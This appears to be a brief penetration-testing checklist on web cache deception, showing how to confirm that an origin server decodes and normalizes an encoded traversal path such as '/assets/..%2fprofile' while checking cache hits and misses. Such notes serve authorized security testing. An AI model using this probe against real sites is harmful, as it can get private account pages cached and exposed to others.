Origin Server Normalization
- [ ] Test on static files where cache state can be found.
- [ ] Use timing and Ctrl + Shift + I to look at response time to identify cache.
```bash
/profile -> /profile (cache miss)
/profile -> /profile (cache hit)
/assets/..%2fprofile -> /profile (cache miss)
/assets/..%2fprofile -> /profile (confirm WCD origin normalization)

# responds as base means origin server decodes and normalizes
```
